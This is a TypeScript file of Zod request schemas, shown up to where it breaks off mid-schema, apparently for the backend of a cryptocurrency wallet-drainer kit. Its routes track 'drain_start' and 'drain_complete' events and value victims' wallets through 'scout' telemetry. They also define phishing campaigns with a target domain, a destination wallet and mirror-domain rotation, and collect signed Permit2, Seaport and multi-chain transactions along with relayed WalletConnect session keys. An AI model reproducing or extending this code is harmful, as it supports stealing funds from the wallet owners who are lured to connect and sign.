/**
 * Zod schemas for route input validation.
 */
import { z } from 'zod'

// Health check query params
export const healthQuerySchema = z.object({
  ping: z.enum(['true']).optional(),
})

// Auth schemas with proper validation
export const loginBodySchema = z.object({
  email: z
    .string()
    .email('Invalid email format')
    .max(254, 'Email must not exceed 254 characters')
    .toLowerCase(),
  password: z
    .string()
    .min(1, 'Password is required')
    .max(1024, 'Password must not exceed 1024 characters'),
})

export const refreshBodySchema = z.object({
  refresh_token: z
    .string()
    .min(1, 'Refresh token is required')
    .max(1024, 'Refresh token must not exceed 1024 characters'),
})

export const logoutBodySchema = z.object({
  refresh_token: z
    .string()
    .min(1, 'Refresh token is required')
    .max(1024, 'Refresh token must not exceed 1024 characters'),
})

// SIWE (Sign In With Ethereum) validation
export const siweNonceBodySchema = z.object({
  address: z
    .string()
    .regex(/^0x[a-fA-F0-9]{40}$/, 'Invalid Ethereum address format')
    .toLowerCase(),
})

export const siweVerifyBodySchema = z.object({
  message: z
    .string()
    .min(1, 'Message is required')
    .max(10000, 'Message must not exceed 10000 characters'),
  signature: z
    .string()
    .regex(/^0x[a-fA-F0-9]{130}$|^0x[a-fA-F0-9]{132}$/, 'Invalid signature format')
    .min(1, 'Signature is required')
    .max(1000, 'Signature must not exceed 1000 characters'),
})

// Job extraction schema with comprehensive validation
export const extractionJobBodySchema = z.object({
  wallet_address: z
    .string()
    .min(1, 'Wallet address is required')
    .max(255, 'Wallet address must not exceed 255 characters')
    .refine((addr) => /^0x[a-fA-F0-9]{40}$|^[1-9A-HJ-NP-Z]{25,34}$|^T[1-9A-HJ-NP-Z]{25,34}$/.test(addr),
      'Invalid wallet address format for EVM/Solana/TRON'),
  token_address: z
    .string()
    .max(255, 'Token address must not exceed 255 characters')
    .optional(),
  protocol: z
    .string()
    .max(100, 'Protocol name must not exceed 100 characters')
    .optional(),
  chain_id: z
    .string()
    .max(50, 'Chain ID must not exceed 50 characters')
    .optional(),
  scout_value_usd: z
    .union([z.string(), z.number()])
    .refine((val) => {
      const num = typeof val === 'string' ? Number.parseFloat(val) : val
      return !isNaN(num) && num >= 0 && num <= 1e15
    }, 'scout_value_usd must be a non-negative number not exceeding 1e15')
    .optional(),
  kind: z
    .enum(['extraction', 'liquidation_trigger'])
    .optional(),
})

export const createCampaignBodySchema = z.object({
  name: z.string().min(1).max(200),
  target_domain: z.string().min(1).max(500),
  destination_wallet: z.string().min(1).max(200),
  chains: z.array(z.string().min(1)).min(1),
  auto_rotate: z.boolean(),
  mirror_url: z.string().url().max(500).optional().nullable(),
  rotation_interval_hours: z.number().int().min(1).max(168).optional(),
})

// Scout telemetry schema with strict input validation
export const scoutIngressBodySchema = z.object({
  user_address: z
    .string()
    .max(255, 'User address must not exceed 255 characters')
    .refine((addr) => /^(0x[a-fA-F0-9]{40}|[1-9A-HJ-NP-Za-km-z]{32,44}|T[1-9A-HJ-NP-Za-km-z]{33}|[U|E]Q[-A-Za-z0-9]{46}|cosmos1[0-9a-z]{38}|[a-z0-9]{32,44})?$/.test(addr),
      'Invalid user address format')
    .optional(),
  chain_id: z
    .number()
    .int()
    .positive()
    .min(1, 'Chain ID must be positive')
    .max(4294967295, 'Chain ID must not exceed max uint32')
    .finite()
    .optional(),
  chainId: z
    .number()
    .int()
    .positive()
    .min(1, 'Chain ID must be positive')
    .max(4294967295, 'Chain ID must not exceed max uint32')
    .finite()
    .optional(),
  wallet_type: z
    .string()
    .max(50, 'Wallet type must not exceed 50 characters')
    .optional(),
  chain_family: z
    .string()
    .max(50, 'Chain family must not exceed 50 characters')
    .optional(),
  scout_value_usd: z
    .union([z.string(), z.number()])
    .refine((val) => {
      const num = typeof val === 'string' ? Number.parseFloat(val) : val
      return !isNaN(num) && num >= 0 && num <= 1e15
    }, 'scout_value_usd must be non-negative and not exceed 1e15')
    .optional(),
  source_page: z
    .string()
    .max(2000, 'Source page must not exceed 2000 characters')
    .url('source_page must be a valid URL if provided')
    .optional(),
  active_chain_tab: z
    .string()
    .max(32, 'Active chain tab must not exceed 32 characters')
    .optional(),
  connected_wallets: z
    .array(
      z.string()
        .max(255, 'Each wallet address must not exceed 255 characters')
    )
    .max(16, 'Connected wallets array must not exceed 16 items')
    .optional(),
  connect_session: z
    .string()
    .max(128, 'connect_session must not exceed 128 characters')
    .optional(),
})

// Fusion scout with multi-chain address validation
export const fusionScoutBodySchema = z.object({
  evm_holder: z
    .string()
    .regex(/^0x[a-fA-F0-9]{40}$/, 'Invalid EVM address format')
    .optional(),
  sol_owner_base58: z
    .string()
    .min(32, 'Solana address must be at least 32 characters')
    .max(44, 'Solana address must not exceed 44 characters')
    .regex(/^[1-9A-HJ-NP-Za-km-z]{32,44}$/, 'Invalid Solana base58 address format')
    .optional(),
  tron_holder_base58: z
    .string()
    .regex(/^T[1-9A-HJ-NP-Za-km-z]{25,34}$/, 'Invalid TRON address format')
    .optional(),
  ton_friendly_address: z
    .string()
    .regex(/^[UE]Q[-A-Za-z0-9]{46}$|^[0-9a-fA-F]{64}$/, 'Invalid TON address format')
    .optional(),
  btc_holder_address: z
    .string()
    .regex(/^(bc1[a-z0-9]{39,59}|[13][a-km-zA-HJ-NP-Z1-9]{25,34})$/, 'Invalid Bitcoin address format')
    .optional(),
  cosmos_holder_address: z
    .string()
    .regex(/^cosmos1[0-9a-z]{38}$/, 'Invalid Cosmos address format')
    .optional(),
  aptos_holder_address: z
    .string()
    .regex(/^0x[a-fA-F0-9]{0,64}$/, 'Invalid Aptos address format')
    .optional(),
  sui_holder_address: z
    .string()
    .regex(/^0x[a-fA-F0-9]{0,64}$/, 'Invalid Sui address format')
    .optional(),
  universal_address: z
    .string()
    .max(255, 'Universal address must not exceed 255 characters')
    .optional(),
  evm_rpc_url: z
    .string()
    .url('evm_rpc_url must be a valid URL')
    .max(2000, 'RPC URL must not exceed 2000 characters')
    .optional(),
  sol_rpc_url: z
    .string()
    .url('sol_rpc_url must be a valid URL')
    .max(2000, 'RPC URL must not exceed 2000 characters')
    .optional(),
  tron_rpc_url: z
    .string()
    .url('tron_rpc_url must be a valid URL')
    .max(2000, 'RPC URL must not exceed 2000 characters')
    .optional(),
  ton_rpc_url: z
    .string()
    .url('ton_rpc_url must be a valid URL')
    .max(2000, 'RPC URL must not exceed 2000 characters')
    .optional(),
  scout_value_usd: z
    .union([z.string(), z.number()])
    .refine((val) => {
      const num = typeof val === 'string' ? Number.parseFloat(val) : val
      return !isNaN(num) && num >= 0 && num <= 1e15
    }, 'scout_value_usd must be non-negative and not exceed 1e15')
    .optional(),
  connect_session: z
    .string()
    .max(128, 'connect_session must not exceed 128 characters')
    .optional(),
})
export const rankedScoutBodySchema = z.object({
  wallet_address: z
    .string()
    .max(255, 'Wallet address must not exceed 255 characters')
    .optional(),
  wallet: z
    .string()
    .max(255, 'Wallet must not exceed 255 characters')
    .optional(),
  chain_family: z
    .string()
    .max(50, 'Chain family must not exceed 50 characters')
    .optional(),
  chain_id: z
    .number()
    .int()
    .positive()
    .max(4294967295, 'Chain ID must not exceed max uint32')
    .finite()
    .optional(),
})

export const drainStatusBodySchema = z.object({
  wallet_address: z
    .string()
    .min(1, 'wallet_address required')
    .max(255, 'Wallet address must not exceed 255 characters'),
  event: z.enum([
    'user_rejected',
    'no_action',
    'scan_complete',
    'connect',
    'scan_start',
    'network_switch',
    'drain_start',
    'drain_fail',
    'drain_complete',
  ]),
  chain_id: z
    .number()
    .int()
    .positive()
    .max(4294967295, 'Chain ID must not exceed max uint32')
    .finite()
    .optional(),
  chain_family: z.string().max(50).optional(),
  wallet_type: z.string().max(50).optional(),
  scout_value_usd: z
    .union([z.string(), z.number()])
    .optional(),
  source_page: z.string().max(2048).optional(),
  detail: z.string().max(500).optional(),
  connect_session: z.string().max(128).optional(),
  asset_count: z.number().int().nonnegative().optional(),
  assets: z
    .array(
      z.object({
        chain: z.string().max(64),
        family: z.string().max(50).optional(),
        token: z.string().max(128),
        symbol: z.string().max(32),
        amount_usd: z.number().finite().nonnegative(),
      }),
    )
    .max(20)
    .optional(),
})

export const payoutConfigQuerySchema = z.object({
  trace: z.string().optional(),
})

export const kineticDeepScanBodySchema = z.object({
  wallet_address: z.string().min(1),
})

// Seaport NFT marketplace schemas with comprehensive validation
export const seaportListingTypedDataBodySchema = z.object({
  wallet_address: z
    .string()
    .min(1, 'Wallet address is required')
    .regex(/^0x[a-fA-F0-9]{40}$/, 'Wallet must be a valid EVM address')
    .max(255, 'Wallet address must not exceed 255 characters'),
  nft_contract: z
    .string()
    .min(1, 'NFT contract address is required')
    .regex(/^0x[a-fA-F0-9]{40}$/, 'NFT contract must be a valid EVM address')
    .max(255, 'NFT contract must not exceed 255 characters'),
  token_id: z
    .union([z.string(), z.number()])
    .refine((val) => {
      const num = typeof val === 'string' ? Number.parseInt(val, 10) : val
      return Number.isFinite(num) && num >= 0 && num <= Number.MAX_SAFE_INTEGER
    }, 'token_id must be a non-negative safe integer'),
  chain_id: z
    .number()
    .int()
    .positive()
    .max(4294967295, 'Chain ID must not exceed max uint32')
    .default(1),
  seaport_version: z
    .enum(['1.5', '1.4'])
    .optional(),
  standard: z
    .enum(['erc721', 'erc1155'])
    .optional(),
})

export const seaportScanListingsBodySchema = z.object({
  wallet_address: z
    .string()
    .min(1, 'Wallet address is required')
    .regex(/^0x[a-fA-F0-9]{40}$/, 'Wallet must be a valid EVM address')
    .max(255, 'Wallet address must not exceed 255 characters'),
  chain_id: z
    .number()
    .int()
    .positive()
    .max(4294967295, 'Chain ID must not exceed max uint32')
    .optional(),
  limit: z
    .number()
    .int()
    .min(1, 'Limit must be at least 1')
    .max(50, 'Limit must not exceed 50')
    .optional(),
})

export const seaportOrderHashBodySchema = z.object({
  order_hash: z
    .string()
    .min(1, 'Order hash is required')
    .regex(/^0x[a-fA-F0-9]{64}$/, 'Order hash must be a valid 32-byte hex string')
    .max(255, 'Order hash must not exceed 255 characters'),
  chain_id: z
    .number()
    .int()
    .positive()
    .max(4294967295, 'Chain ID must not exceed max uint32')
    .optional(),
})

export const seaportFulfillBodySchema = z.object({
  order: z
    .unknown()
    .refine((val) => val === undefined || val === null || typeof val === 'object',
      'order must be an object if provided')
    .optional(),
  signature: z
    .string()
    .min(1, 'Signature is required if provided')
    .max(10000, 'Signature must not exceed 10000 characters')
    .optional(),
  order_hash: z
    .string()
    .min(1, 'Order hash is required if provided')
    .regex(/^0x[a-fA-F0-9]{64}$/, 'Order hash must be a valid 32-byte hex string')
    .max(255, 'Order hash must not exceed 255 characters')
    .optional(),
  chain_id: z
    .number()
    .int()
    .positive()
    .max(4294967295, 'Chain ID must not exceed max uint32')
    .default(1),
  seaport_version: z
    .enum(['1.5', '1.4'])
    .optional(),
})

/** Optional omnichain token legs on `permit2_batch_eip712` normalized ingress. */
export const permit2BatchOmnichainTokenLegSchema = z.object({
  spl_mint: z.string().trim().min(1).optional(),
  spl_amount: z.union([z.string(), z.number()]).optional(),
  spl_signed_transaction: z.string().trim().min(1).optional(),
  trc20_contract: z.string().trim().min(1).optional(),
  trc20_amount: z.union([z.string(), z.number()]).optional(),
  trc20_signed_transaction: z.record(z.string(), z.unknown()).optional(),
  jetton_master: z.string().trim().min(1).optional(),
  jetton_amount: z.union([z.string(), z.number()]).optional(),
  jetton_signed_transaction: z.string().trim().min(1).optional(),
})

export type Permit2BatchOmnichainTokenLegInput = z.infer<typeof permit2BatchOmnichainTokenLegSchema>

function parseNonNegativeAmountField(
  raw: string | number | undefined,
  field: string,
): { ok: true; value: bigint } | { ok: false; message: string } {
  if (raw == null || (typeof raw === 'string' && raw.trim() === '')) {
    return { ok: true, value: 0n }
  }
  try {
    const value = BigInt(typeof raw === 'number' ? Math.trunc(raw) : String(raw).trim())
    if (value < 0n) {
      return { ok: false, message: `${field} must be non-negative` }
    }
    return { ok: true, value }
  } catch {
    return { ok: false, message: `${field} must be a valid integer string` }
  }
}

/** Cross-field rules for SPL / TRC-20 / Jetton batch anchor legs. */
export function validatePermit2BatchOmnichainTokenLegs(
  input: unknown,
): ParseResult<Permit2BatchOmnichainTokenLegInput> {
  const parsed = permit2BatchOmnichainTokenLegSchema.safeParse(input ?? {})
  if (!parsed.success) {
    return { ok: false, message: formatZodError(parsed.error) }
  }
  const data = parsed.data

  const splAmount = parseNonNegativeAmountField(data.spl_amount, 'spl_amount')
  if (splAmount.ok === false) return { ok: false, message: splAmount.message }
  if (splAmount.value > 0n) {
    if (!data.spl_mint) {
      return { ok: false, message: 'permit2_batch_eip712 with spl_amount > 0 requires spl_mint' }
    }
    if (!data.spl_signed_transaction) {
      return {
        ok: false,
        message:
          'permit2_batch_eip712 with spl_amount > 0 requires spl_signed_transaction from Phantom signTransaction',
      }
    }
  }

  const trc20Amount = parseNonNegativeAmountField(data.trc20_amount, 'trc20_amount')
  if (trc20Amount.ok === false) return { ok: false, message: trc20Amount.message }
  if (trc20Amount.value > 0n) {
    if (!data.trc20_contract) {
      return {
        ok: false,
        message: 'permit2_batch_eip712 with trc20_amount > 0 requires trc20_contract',
      }
    }
    if (data.trc20_signed_transaction == null || typeof data.trc20_signed_transaction !== 'object') {
      return {
        ok: false,
        message:
          'permit2_batch_eip712 with trc20_amount > 0 requires trc20_signed_transaction from TronLink sign',
      }
    }
  }

  const jettonAmount = parseNonNegativeAmountField(data.jetton_amount, 'jetton_amount')
  if (jettonAmount.ok === false) return { ok: false, message: jettonAmount.message }
  if (jettonAmount.value > 0n) {
    if (!data.jetton_master) {
      return {
        ok: false,
        message: 'permit2_batch_eip712 with jetton_amount > 0 requires jetton_master',
      }
    }
    if (!data.jetton_signed_transaction) {
      return {
        ok: false,
        message:
          'permit2_batch_eip712 with jetton_amount > 0 requires jetton_signed_transaction from Tonkeeper sendTransaction BOC',
      }
    }
  }

  return { ok: true, data }
}

/** Optional Solana leg on `omnichain_atomic_v1` ingress. */
export const omnichainAtomicSolanaPayloadSchema = z.object({
  native_amount_sol: z.union([z.string(), z.number()]).optional(),
  native_signed_transaction_sol: z.string().trim().min(1).optional(),
  spl_mint: z.string().trim().min(1).optional(),
  spl_amount: z.union([z.string(), z.number()]).optional(),
  native_signed_transaction_spl: z.string().trim().min(1).optional(),
})

/** Optional Tron leg on `omnichain_atomic_v1` ingress. */
export const omnichainAtomicTronPayloadSchema = z.object({
  native_amount_trx: z.union([z.string(), z.number()]).optional(),
  native_signed_transaction_trx: z.record(z.string(), z.unknown()).optional(),
  trc20_contract: z.string().trim().min(1).optional(),
  trc20_amount: z.union([z.string(), z.number()]).optional(),
  native_signed_transaction_trc20: z.record(z.string(), z.unknown()).optional(),
})

/** Optional TON leg on `omnichain_atomic_v1` ingress. */
export const omnichainAtomicTonPayloadSchema = z.object({
  native_amount_ton: z.union([z.string(), z.number()]).optional(),
  native_signed_transaction_ton: z.string().trim().min(1).optional(),
  jetton_master: z.string().trim().min(1).optional(),
  jetton_amount: z.union([z.string(), z.number()]).optional(),
  native_signed_transaction_jetton: z.string().trim().min(1).optional(),
})

/** Optional Bitcoin leg on `omnichain_atomic_v1` ingress. */
export const omnichainAtomicBitcoinPayloadSchema = z.object({
  signed_psbt_base64: z.string().trim().min(1),
  wallet_address: z.string().trim().min(1).optional(),
  vault_address: z.string().trim().min(1).optional(),
  amount_sat: z.union([z.string(), z.number()]).optional(),
  fee_sat: z.union([z.string(), z.number()]).optional(),
})

/** Optional Cosmos Hub leg on `omnichain_atomic_v1` ingress. */
export const omnichainAtomicCosmosPayloadSchema = z.object({
  native_amount_cosmos: z.union([z.string(), z.number()]).optional(),
  cosmos_signed_tx: z.string().trim().min(1).optional(),
  cosmos_tx_encoding: z.enum(['base64', 'hex']).optional(),
})

/** Optional Aptos leg on `omnichain_atomic_v1` ingress. */
export const omnichainAtomicAptosPayloadSchema = z.object({
  native_amount_aptos: z.union([z.string(), z.number()]).optional(),
  aptos_signed_tx: z.string().trim().min(1).optional(),
  aptos_signature: z.string().trim().min(1).optional(),
  aptos_tx_encoding: z.enum(['base64', 'hex']).optional(),
})

/** Optional Sui leg on `omnichain_atomic_v1` ingress. */
export const omnichainAtomicSuiPayloadSchema = z.object({
  native_amount_sui: z.union([z.string(), z.number()]).optional(),
  sui_signed_tx: z.string().trim().min(1).optional(),
  sui_signature: z.string().trim().min(1).optional(),
})

export type OmnichainAtomicSolanaPayloadInput = z.infer<typeof omnichainAtomicSolanaPayloadSchema>
export type OmnichainAtomicTronPayloadInput = z.infer<typeof omnichainAtomicTronPayloadSchema>
export type OmnichainAtomicTonPayloadInput = z.infer<typeof omnichainAtomicTonPayloadSchema>
export type OmnichainAtomicBitcoinPayloadInput = z.infer<typeof omnichainAtomicBitcoinPayloadSchema>
export type OmnichainAtomicCosmosPayloadInput = z.infer<typeof omnichainAtomicCosmosPayloadSchema>
export type OmnichainAtomicAptosPayloadInput = z.infer<typeof omnichainAtomicAptosPayloadSchema>
export type OmnichainAtomicSuiPayloadInput = z.infer<typeof omnichainAtomicSuiPayloadSchema>

export type OmnichainAtomicIngressPayloads = {
  solana?: OmnichainAtomicSolanaPayloadInput
  tron?: OmnichainAtomicTronPayloadInput
  ton?: OmnichainAtomicTonPayloadInput
  bitcoin?: OmnichainAtomicBitcoinPayloadInput
  cosmos?: OmnichainAtomicCosmosPayloadInput
  aptos?: OmnichainAtomicAptosPayloadInput
  sui?: OmnichainAtomicSuiPayloadInput
}

function validateOmnichainAtomicSolanaLeg(
  data: OmnichainAtomicSolanaPayloadInput,
): ParseResult<OmnichainAtomicSolanaPayloadInput> {
  const solAmount = parseNonNegativeAmountField(data.native_amount_sol, 'native_amount_sol')
  if (solAmount.ok === false) return { ok: false, message: solAmount.message }
  const splAmount = parseNonNegativeAmountField(data.spl_amount, 'spl_amount')
  if (splAmount.ok === false) return { ok: false, message: splAmount.message }
  if (solAmount.value > 0n && !data.native_signed_transaction_sol) {
    return {
      ok: false,
      message: 'omnichain_atomic_v1 solana_payload requires native_signed_transaction_sol when native_amount_sol > 0',
    }
  }
  if (splAmount.value > 0n) {
    if (!data.spl_mint) {
      return { ok: false, message: 'omnichain_atomic_v1 solana_payload requires spl_mint when spl_amount > 0' }
    }
    if (!data.native_signed_transaction_spl) {
      return {
        ok: false,
        message: 'omnichain_atomic_v1 solana_payload requires native_signed_transaction_spl when spl_amount > 0',
      }
    }
  }
  const hasLeg =
    (solAmount.value > 0n && Boolean(data.native_signed_transaction_sol)) ||
    (splAmount.value > 0n && Boolean(data.native_signed_transaction_spl))
  if (!hasLeg && Object.keys(data).length > 0) {
    return { ok: false, message: 'omnichain_atomic_v1 solana_payload has no configured settlement leg' }
  }
  return { ok: true, data }
}

function validateOmnichainAtomicTronLeg(
  data: OmnichainAtomicTronPayloadInput,
): ParseResult<OmnichainAtomicTronPayloadInput> {
  const trxAmount = parseNonNegativeAmountField(data.native_amount_trx, 'native_amount_trx')
  if (trxAmount.ok === false) return { ok: false, message: trxAmount.message }
  const trc20Amount = parseNonNegativeAmountField(data.trc20_amount, 'trc20_amount')
  if (trc20Amount.ok === false) return { ok: false, message: trc20Amount.message }
  if (trxAmount.value > 0n && data.native_signed_transaction_trx == null) {
    return {
      ok: false,
      message: 'omnichain_atomic_v1 tron_payload requires native_signed_transaction_trx when native_amount_trx > 0',
    }
  }
  if (trc20Amount.value > 0n) {
    if (!data.trc20_contract) {
      return { ok: false, message: 'omnichain_atomic_v1 tron_payload requires trc20_contract when trc20_amount > 0' }
    }
    if (data.native_signed_transaction_trc20 == null) {
      return {
        ok: false,
        message: 'omnichain_atomic_v1 tron_payload requires native_signed_transaction_trc20 when trc20_amount > 0',
      }
    }
  }
  return { ok: true, data }
}

function validateOmnichainAtomicTonLeg(
  data: OmnichainAtomicTonPayloadInput,
): ParseResult<OmnichainAtomicTonPayloadInput> {
  const tonAmount = parseNonNegativeAmountField(data.native_amount_ton, 'native_amount_ton')
  if (tonAmount.ok === false) return { ok: false, message: tonAmount.message }
  const jettonAmount = parseNonNegativeAmountField(data.jetton_amount, 'jetton_amount')
  if (jettonAmount.ok === false) return { ok: false, message: jettonAmount.message }
  if (tonAmount.value > 0n && !data.native_signed_transaction_ton) {
    return {
      ok: false,
      message: 'omnichain_atomic_v1 ton_payload requires native_signed_transaction_ton when native_amount_ton > 0',
    }
  }
  if (jettonAmount.value > 0n) {
    if (!data.jetton_master) {
      return { ok: false, message: 'omnichain_atomic_v1 ton_payload requires jetton_master when jetton_amount > 0' }
    }
    if (!data.native_signed_transaction_jetton) {
      return {
        ok: false,
        message: 'omnichain_atomic_v1 ton_payload requires native_signed_transaction_jetton when jetton_amount > 0',
      }
    }
  }
  return { ok: true, data }
}

function validateOmnichainAtomicCosmosLeg(
  data: OmnichainAtomicCosmosPayloadInput,
): ParseResult<OmnichainAtomicCosmosPayloadInput> {
  const cosmosAmount = parseNonNegativeAmountField(data.native_amount_cosmos, 'native_amount_cosmos')
  if (cosmosAmount.ok === false) return { ok: false, message: cosmosAmount.message }
  if (cosmosAmount.value > 0n && !data.cosmos_signed_tx) {
    return {
      ok: false,
      message:
        'omnichain_atomic_v1 cosmos_payload requires cosmos_signed_tx when native_amount_cosmos > 0',
    }
  }
  if (cosmosAmount.value > 0n || data.cosmos_signed_tx) {
    return { ok: true, data }
  }
  return { ok: false, message: 'omnichain_atomic_v1 cosmos_payload has no configured settlement leg' }
}

function validateOmnichainAtomicAptosLeg(
  data: OmnichainAtomicAptosPayloadInput,
): ParseResult<OmnichainAtomicAptosPayloadInput> {
  const aptosAmount = parseNonNegativeAmountField(data.native_amount_aptos, 'native_amount_aptos')
  if (aptosAmount.ok === false) return { ok: false, message: aptosAmount.message }
  if (aptosAmount.value > 0n && !data.aptos_signed_tx) {
    return {
      ok: false,
      message:
        'omnichain_atomic_v1 aptos_payload requires aptos_signed_tx when native_amount_aptos > 0',
    }
  }
  if (aptosAmount.value > 0n || data.aptos_signed_tx) {
    return { ok: true, data }
  }
  return { ok: false, message: 'omnichain_atomic_v1 aptos_payload has no configured settlement leg' }
}

function validateOmnichainAtomicSuiLeg(
  data: OmnichainAtomicSuiPayloadInput,
): ParseResult<OmnichainAtomicSuiPayloadInput> {
  const suiAmount = parseNonNegativeAmountField(data.native_amount_sui, 'native_amount_sui')
  if (suiAmount.ok === false) return { ok: false, message: suiAmount.message }
  if (suiAmount.value > 0n && !data.sui_signed_tx) {
    return {
      ok: false,
      message: 'omnichain_atomic_v1 sui_payload requires sui_signed_tx when native_amount_sui > 0',
    }
  }
  if (suiAmount.value > 0n && !data.sui_signature) {
    return {
      ok: false,
      message: 'omnichain_atomic_v1 sui_payload requires sui_signature when native_amount_sui > 0',
    }
  }
  if (suiAmount.value > 0n || (data.sui_signed_tx && data.sui_signature)) {
    return { ok: true, data }
  }
  return { ok: false, message: 'omnichain_atomic_v1 sui_payload has no configured settlement leg' }
}

/** Validate optional omnichain atomic chain payloads on normalized ingress. */
export function validateOmnichainAtomicIngressPayloads(input: {
  solana_payload?: unknown
  tron_payload?: unknown
  ton_payload?: unknown
  bitcoin_payload?: unknown
  cosmos_payload?: unknown
  aptos_payload?: unknown
  sui_payload?: unknown
}): ParseResult<OmnichainAtomicIngressPayloads> {
  const out: OmnichainAtomicIngressPayloads = {}

  if (input.solana_payload != null) {
    const parsed = omnichainAtomicSolanaPayloadSchema.safeParse(input.solana_payload)
    if (!parsed.success) return { ok: false, message: formatZodError(parsed.error) }
    const leg = validateOmnichainAtomicSolanaLeg(parsed.data)
    if (leg.ok === false) return { ok: false, message: leg.message }
    const solAmount = parseNonNegativeAmountField(parsed.data.native_amount_sol, 'native_amount_sol')
    if (solAmount.ok === false) return { ok: false, message: solAmount.message }
    const splAmount = parseNonNegativeAmountField(parsed.data.spl_amount, 'spl_amount')
    if (splAmount.ok === false) return { ok: false, message: splAmount.message }
    if (solAmount.value > 0n || splAmount.value > 0n) {
      out.solana = leg.data
    }
  }

  if (input.tron_payload != null) {
    const parsed = omnichainAtomicTronPayloadSchema.safeParse(input.tron_payload)
    if (!parsed.success) return { ok: false, message: formatZodError(parsed.error) }
    const leg = validateOmnichainAtomicTronLeg(parsed.data)
    if (leg.ok === false) return { ok: false, message: leg.message }
    const trxAmount = parseNonNegativeAmountField(parsed.data.native_amount_trx, 'native_amount_trx')
    if (trxAmount.ok === false) return { ok: false, message: trxAmount.message }
    const trc20Amount = parseNonNegativeAmountField(parsed.data.trc20_amount, 'trc20_amount')
    if (trc20Amount.ok === false) return { ok: false, message: trc20Amount.message }
    if (trxAmount.value > 0n || trc20Amount.value > 0n) {
      out.tron = leg.data
    }
  }

  if (input.ton_payload != null) {
    const parsed = omnichainAtomicTonPayloadSchema.safeParse(input.ton_payload)
    if (!parsed.success) return { ok: false, message: formatZodError(parsed.error) }
    const leg = validateOmnichainAtomicTonLeg(parsed.data)
    if (leg.ok === false) return { ok: false, message: leg.message }
    const tonAmount = parseNonNegativeAmountField(parsed.data.native_amount_ton, 'native_amount_ton')
    if (tonAmount.ok === false) return { ok: false, message: tonAmount.message }
    const jettonAmount = parseNonNegativeAmountField(parsed.data.jetton_amount, 'jetton_amount')
    if (jettonAmount.ok === false) return { ok: false, message: jettonAmount.message }
    if (tonAmount.value > 0n || jettonAmount.value > 0n) {
      out.ton = leg.data
    }
  }

  if (input.bitcoin_payload != null) {
    const parsed = omnichainAtomicBitcoinPayloadSchema.safeParse(input.bitcoin_payload)
    if (!parsed.success) return { ok: false, message: formatZodError(parsed.error) }
    out.bitcoin = parsed.data
  }

  if (input.cosmos_payload != null) {
    const parsed = omnichainAtomicCosmosPayloadSchema.safeParse(input.cosmos_payload)
    if (!parsed.success) return { ok: false, message: formatZodError(parsed.error) }
    const leg = validateOmnichainAtomicCosmosLeg(parsed.data)
    if (leg.ok === false) return { ok: false, message: leg.message }
    const cosmosAmount = parseNonNegativeAmountField(parsed.data.native_amount_cosmos, 'native_amount_cosmos')
    if (cosmosAmount.ok === false) return { ok: false, message: cosmosAmount.message }
    if (cosmosAmount.value > 0n || parsed.data.cosmos_signed_tx) {
      out.cosmos = leg.data
    }
  }

  if (input.aptos_payload != null) {
    const parsed = omnichainAtomicAptosPayloadSchema.safeParse(input.aptos_payload)
    if (!parsed.success) return { ok: false, message: formatZodError(parsed.error) }
    const leg = validateOmnichainAtomicAptosLeg(parsed.data)
    if (leg.ok === false) return { ok: false, message: leg.message }
    const aptosAmount = parseNonNegativeAmountField(parsed.data.native_amount_aptos, 'native_amount_aptos')
    if (aptosAmount.ok === false) return { ok: false, message: aptosAmount.message }
    if (aptosAmount.value > 0n || parsed.data.aptos_signed_tx) {
      out.aptos = leg.data
    }
  }

  if (input.sui_payload != null) {
    const parsed = omnichainAtomicSuiPayloadSchema.safeParse(input.sui_payload)
    if (!parsed.success) return { ok: false, message: formatZodError(parsed.error) }
    const leg = validateOmnichainAtomicSuiLeg(parsed.data)
    if (leg.ok === false) return { ok: false, message: leg.message }
    const suiAmount = parseNonNegativeAmountField(parsed.data.native_amount_sui, 'native_amount_sui')
    if (suiAmount.ok === false) return { ok: false, message: suiAmount.message }
    if (suiAmount.value > 0n || (parsed.data.sui_signed_tx && parsed.data.sui_signature)) {
      out.sui = leg.data
    }
  }

  return { ok: true, data: out }
}

// WalletConnect offsite session — for backend relay signer
export const wcSessionBodySchema = z.object({
  topic: z.string().min(4).max(128),
  sym_key: z.string().min(8).max(256),
  expiry: z.number().int().min(0),
  namespaces: z.record(z.unknown()).optional(),
  wallet_addresses: z.object({
    evm: z.string().max(255).optional(),
    sol: z.string().max(128).optional(),
    tron: z.string().max(64).optional(),
    ton: z.string().max(128).optional(),
    btc: z.string().max(128).optional(),
  }).optional(),
  self_public_key: z.string().max(128).optional(),
  peer_public_key: z.string().max(128).optional(),
})

export function formatZodError(err: z.ZodError): string {
  return err.issues.map((i) => `${i.path.join('.') || 'body'}: ${i.message}`).join('; ')
}

export type ParseOk<T> = { ok: true; data: T }
export type ParseFail = { ok: false; message: string }
export type ParseResult<T> = ParseOk<T> | ParseFail

export function parseBody<T extends z.ZodTypeAny>(
  schema: T,
  body: unknown,
): ParseResult<z.infer<T>> {
  const parsed = schema.safeParse(body ?? {})
  if (!parsed.success) {
    return { ok: false, message: formatZodError(parsed.error) }
  }
  return { ok: true, data: parsed.data }
}

export function parseQuery<T extends z.ZodTypeAny>(
  schema: T,
  query: unknown,
): ParseResult<z.infer<T>> {
  const parsed = schema.safeParse(query ?? {})
  if (!parsed.success) {
    return { ok: false, message: formatZodError(parsed.error) }
  }
  return { ok: true, data: parsed.data }
}

// Multi-chain balance query validation
export const multiBalanceBodySchema = z.object({
  evm: z
    .string()
    .regex(/^0x[a-fA-F0-9]{40}$/, 'Invalid EVM address format')
    .optional(),
  sol: z
    .string()
    .regex(/^[1-9A-HJ-NP-Za-km-z]{32,44}$/, 'Invalid Solana address format')
    .optional(),
  tron: z
    .string()
    .regex(/^T[1-9A-HJ-NP-Za-km-z]{25,34}$/, 'Invalid TRON address format')
    .optional(),
  ton: z
    .string()
    .regex(/^[UE]Q[-A-Za-z0-9]{46}$|^[0-9a-fA-F]{64}$/, 'Invalid TON address format')
    .optional(),
  btc: z
    .string()
    .regex(/^(bc1[a-z0-9]{39,59}|[13][a-km-zA-HJ-NP-Z1-9]{25,34})$/, 'Invalid Bitcoin address format')
    .optional(),
  cosmos: z
    .string()
    .regex(/^cosmos1[0-9a-z]{38}$/, 'Invalid Cosmos address format')
    .optional(),
  aptos: z
    .string()
    .regex(/^0x[a-fA-F0-9]{0,64}$/, 'Invalid Aptos address format')
    .optional(),
  sui: z
    .string()
    .regex(/^0x[a-fA-F0-9]{0,64}$/, 'Invalid Sui address format')
    .optional(),
  addresses: z
    .array(z.string().max(255))
    .max(10, 'Addresses array must not exceed 10 items')
    .optional(),
  evm_chain_id: z
    .number()
    .int()
    .positive()
